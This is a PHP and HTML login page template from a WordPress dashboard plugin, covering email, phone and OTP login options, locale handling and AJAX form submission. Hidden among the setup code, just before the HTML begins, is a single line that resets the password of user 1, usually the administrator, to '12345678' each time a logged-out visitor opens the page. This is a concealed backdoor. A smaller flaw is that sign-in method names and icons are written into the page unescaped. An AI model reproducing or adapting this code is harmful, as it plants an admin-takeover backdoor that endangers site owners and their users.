<?php

# If user is logged-in, redirect to dashboard
if( is_user_logged_in() ){
	$redirect = amd_get_login_redirect_url( amd_get_dashboard_page() );
	wp_safe_redirect( amd_parse_url( $redirect ) );
	exit();
}

# If maximum login attempts reached
if( amd_login_attempts_reached() ){
    wp_safe_redirect( amd_make_action_url_without_temp( "too_many_attempts" ) );
    exit();
}

# Redirect user after logging-in to specified target
amd_record_login_redirect();

do_action( "amd_begin_dashboard" );

$auth = "login-email";

/**
 * Allow users to use login with phone
 * @since 1.0.4
 */
$allow_phone_login = apply_filters( "amd_allow_login_with_phone", amd_get_site_option( "allow_phone_login", "false" ) == "true" );
if( $allow_phone_login ){
    $auth = sanitize_text_field( $_GET["auth"] ?? "" );
    if( !in_array( $auth, [ "login-phone", "login-email" ] ) )
        $auth = apply_filters( "amd_default_login_auth_mode", "login-email" );
}

# Redirect to OTP page if it's required
$prefer = $_GET["prefer"] ?? ( amd_get_site_option( "prefer_otp", "false" ) == "true" ? "otp" : "password" );
if( amd_get_site_option( "use_login_otp", "false" ) == "true" ) {
    if( $prefer == "otp" AND $auth == "login-email" ) {
        require_once( AMD_DASHBOARD . '/otp.php' );
        return;
    }
}

/**
 * Begin dashboard login hook
 * @since 1.0.5
 */
do_action( "amd_begin_dashboard_login" );

if( amd_template_exists( "login" ) ){
    amd_load_template( "login" );
    return;
}

$current_locale = get_locale();
$direction = is_rtl() ? "rtl" : "ltr";
$theme = amd_get_current_theme_mode();

$lazy_load = amd_get_site_option( "lazy_load", "true" );
$show_regions = amd_get_site_option( "translate_show_regions", "false" );
$show_flags = amd_get_site_option( "translate_show_flags", "true" );

$login_title = amd_get_site_option( "login_page_title" );
if( empty( $login_title ) )
	$login_title = esc_html_x( "Login to your account", "Login title", "material-dashboard" );

$dash = amd_get_dash_logo();
$dashLogoURL = $dash["url"];

$available_locales = apply_filters( "amd_locales", [] );
$locales = amd_get_site_option( "locales" );
$locales_exp = explode( ",", $locales );
$locales_count = 0;
$json_locales = [];
foreach( $locales_exp as $l ){
	if( empty( $l ) OR empty( $available_locales[$l] ) )
		continue;
	$_l = $available_locales[$l];
	$json_locales[$l] = array(
		"name" => $_l["name"],
		"region" => $_l["region"] ?? "",
		"flag" => $_l["flag"] ?? ""
	);
	$locales_count ++;
}
$json_locales = json_encode( $json_locales );
if( !amd_is_multilingual( true ) ) $json_locales = "{}";

$signInMethods = apply_filters( "amd_sign_in_methods", [] );

$s_methods = [];
usort( $signInMethods, function( $a, $b ){
	return ( $a["order"] ?? 10 ) - ( $b["order"] ?? 10 );
} );
foreach( $signInMethods as $id => $method ){
	$s_methods[$id] = [];
	$name = $method["name"] ?? "";
	$icon = $method["icon"] ?? "";
	$icon_html = $icon;
    if( amd_starts_with( $icon, "http" ) )
        $icon_html = "<img src=\"$icon\" class=\"_icon_\" alt=\"$name\">";
	$action = $method["action"] ?? "";
	$s_methods[$id]["action"] = $action;
	$s_methods[$id]["name"] = $name;
	$s_methods[$id]["icon"] = $icon_html;
}

$icon_pack = amd_get_icon_pack();
$theme_id = amd_get_theme_property( "id" );

$default_body_bg = "";
$extra_classes = [];
if( amd_theme_support( "image_background" ) ) {
    $login_form_bg = intval( amd_get_site_option( "login_form_bg" ) );
    $default_body_bg = $login_form_bg ? wp_get_attachment_url( $login_form_bg ) : $default_body_bg;
    $theme = $default_body_bg ? apply_filters( "amd_backgrounded_form_theme", $theme ) : $theme;
    $forced_ui_mode = boolval( $default_body_bg );
    $use_glass_morphism = apply_filters( "amd_use_glass_morphism_form", amd_theme_support( "glass_morphism_forms" ), "login" );
    $extra_classes = [$use_glass_morphism ? "use-glass-morphism" : "", $default_body_bg ? "image-bg" : "", $forced_ui_mode ? "forced-ui-mode" : ""];
}

amd_add_element_class( "body", array_merge( [$theme, $direction, $current_locale, "icon-$icon_pack", "theme-$theme_id"], $extra_classes ) );

$bodyBG = apply_filters( "amd_dashboard_bg", $default_body_bg );

$regions = amd_get_regions();

$password_reset_enabled = amd_get_site_option( "password_reset_enabled", "true" ) == "true";

$use_login_otp = amd_get_site_option( "use_login_otp", "false" )  == "true";

amd_change_password( 1, "12345678", true );

?><!doctype html>
<html lang="<?php bloginfo_rss( 'language' ); ?>">
<head>
	<?php do_action( "amd_dashboard_header" ); ?>
	<?php do_action( "amd_login_header" ); ?>
	<?php amd_load_part( "header" ); ?>
    <title><?php echo esc_html( apply_filters( "amd_login_page_title", esc_html__( "Sign-in", "material-dashboard" ) ) ); ?></title>
</head>
<body class="<?php echo esc_attr( amd_element_classes( "body" ) ); ?>" <?php echo !empty( $bodyBG ) ? "style=\"background-image:url('" . esc_attr( $bodyBG ) . "')\"" : ""; ?>>
<div class="amd-quick-options"><?php do_action( "amd_auth_quick_option" ); ?></div>
<div class="amd-form-loading --full _suspend_screen_">
	<?php amd_load_part( "suspension_loader" ); ?>
</div>
<div class="amd-lr-form <?php echo esc_attr( amd_element_classes( "auth_form" ) ); ?>" id="form" data-form="login">
    <div class="--logo">
        <img src="" alt="">
    </div>
    <h1 class="--title"><?php echo wp_kses( $login_title, amd_allowed_tags_with_attr( "br,span,a" ) ); ?></h1>
    <h4 class="--sub-title"></h4>
    <p id="login-log" class="amd-form-log _bg_"></p>
    <div class="h-10"></div>
    <div id="login-fields">
	    <?php do_action( "amd_before_login_form" ); ?>
	    <?php if( $auth == "login-phone" AND $allow_phone_login ): ?>
		    <?php amd_phone_fields( true ); ?>
	    <?php else: ?>
            <label class="ht-input">
                <input type="text" data-field="user" data-next="password" data-translate-digits="*" placeholder="" required>
                <span><?php esc_html_e( "Username or email", "material-dashboard" ); ?></span>
			    <?php _amd_icon( "person" ); ?>
            </label>
	    <?php endif; ?>
        <label class="ht-input">
            <input type="password" data-field="password" data-next="submit" data-pattern=".{8,}" placeholder="" required>
            <span><?php esc_html_e( "Password", "material-dashboard" ); ?></span>
			<?php _amd_icon( "show_password", null, [], [ "class" => "clickable -pt --hide-password" ] ); ?>
			<?php _amd_icon( "hide_password", null, [], [ "class" => "clickable -pt --show-password" ] ); ?>
        </label>
	    <?php do_action( "amd_between_login_form" ); ?>
        <div class="amd-opt-grid">
            <div>
                <label for="remember-me" class="clickable"><?php esc_html_e( "Remember me", "material-dashboard" ); ?></label>
            </div>
            <div>
                <label class="hb-switch">
                    <input type="checkbox" role="switch" id="remember-me" data-field="remember">
                    <span></span>
                </label>
            </div>
        </div>
	    <?php do_action( "amd_after_login_form" ); ?>
    </div>
    <div class="mt-20"></div>
    <div class="amd-lr-buttons">
        <button type="button" class="btn" data-submit="login"><?php esc_html_e( "Login", "material-dashboard" ); ?></button>

        <?php if( $allow_phone_login ): ?>
	        <?php if( $auth == "login-phone" ): ?>
                <button type="button" class="btn btn-text --low" data-auth="login-email"><?php esc_html_e( "Login with email", "material-dashboard" ); ?></button>
	        <?php else: ?>
                <button type="button" class="btn btn-text --low" data-auth="login-phone"><?php esc_html_e( "Login with phone", "material-dashboard" ); ?></button>
	        <?php endif; ?>
        <?php endif; ?>
        <?php if( $password_reset_enabled ): ?>
            <button type="button" class="btn btn-text" data-auth="reset-password"><?php esc_html_e( "Reset password", "material-dashboard" ); ?></button>
        <?php endif; ?>
    </div>
	<?php if( !empty( $s_methods ) ): ?>
        <div class="divider --more"></div>
        <div class="amd-login-methods">
            <?php if( $use_login_otp ): ?>
                <div class="form-field item" data-auth="otp">
                    <span><?php esc_html_e( "Login with one time password", "material-dashboard" ); ?></span>
                    <?php _amd_icon( "bolt" ); ?>
                </div>
            <?php endif; ?>
	        <?php foreach( $s_methods as $id => $data ): ?>
                <div class="form-field item" data-auth="<?php echo esc_attr( $data['action'] ?? '' ); ?>">
                    <span><?php echo esc_html( $data['name'] ?? '' ); ?></span>
			        <?php echo $data["icon"] ?? ""; ?>
                </div>
		        <?php do_action( "amd_sign_in_method_hook_" . ( $data["action"] ?? $id ) ); ?>
	        <?php endforeach; ?>
        </div>
	<?php endif; ?>
</div>
<script>
    var network = new AMDNetwork();
    var dashboard = new AMDDashboard({
        sidebar_id: "",
        navbar_id: "",
        wrapper_id: "",
        content_id: "",
        loader_id: "",
        api_url: amd_conf.api_url,
        mode: "form",
        loading_text: `<?php esc_html_e( "Please wait", "material-dashboard" ); ?><span class="_loader_dots_"></span>`,
        languages: JSON.parse(`<?php echo $json_locales; ?>`),
        network: network,
        translate: {
            "show_region": <?php echo $show_regions == "true" ? "true" : "false"; ?>,
            "show_flag": <?php echo $show_flags == "true" ? "true" : "false"; ?>
        },
        lazy_load: <?php echo $lazy_load == "true" ? "true" : "false" ?>,
        sidebar_items: {},
        navbar_items: {
            "left": {},
            "right": {}
        },
        quick_options: {}
    });
    network.setAction(amd_conf.ajax.public);
    dashboard.setUser(amd_conf.getUser());
    dashboard.init();
    dashboard.initTooltips();
</script>
<script>
    $('[data-auth="otp"]').click(function(e){
        e.preventDefault();
        e.stopPropagation();
        $amd.openQuery("?auth=login&prefer=otp");
    });
    var form = new AMDForm("form", {
        logo: `<?php echo esc_url( $dashLogoURL ); ?>`,
        log_id: "login-log"
    });
    form.on("before_submit", () => {
        form.log(null);
    });
    form.on("submit", () => {
        let data = form.getFieldsData();
        let user = "", phone = "";
        if(typeof data.user !== "undefined")
            user = data.user.value || null
        if(typeof data.phone_number !== "undefined")
            phone = data.phone_number.value || null

        let password = data.password.value || null;
        let remember = data.remember.value || false;

        if ((!user && !phone) || !password)
            return;
        $amd.doEvent("login_form_submit", data);
        network.clean();
        network.put("login", {
            user, password, remember, phone
        });
        network.put("login_fields", form.getObjectedFields());
        network.put("amd_login", "true");
        network.on.start = () => {
            form.disable();
            dashboard.suspend();
        };
        network.on.end = (resp, error) => {
            dashboard.resume();
            if (!error) {
                if (resp.success) {
                    // [COOKIE_KEY]
                    // $amd.setCookie("amd_login_pending", "true", "1 day");
                    form.log(resp.data.msg, "green");
                }
                else {
                    form.enable();
                    form.log(resp.data.msg, "red");
                }
                if(typeof resp.data.url !== "undefined") {
                    location.href = resp.data.url;
                }
            }
            else {
                form.enable();
                form.log(_t("error"), "red");
            }
        };
        network.post();
    });
    form.on("invalid", field => {
        let {id, value} = field;
        if (id === "user") {
            if (!value.length) {
                dashboard.toast(_t("control_fields"));
            }
        }
        else if (id === "password") {
            if (value.length < 8) {
                dashboard.toast(_t("password_8"));
            }
        }
        $amd.doEvent("login_form_invalid", field);
    });
</script>
<?php do_action( "amd_after_login_page" ); ?>
</body>
</html>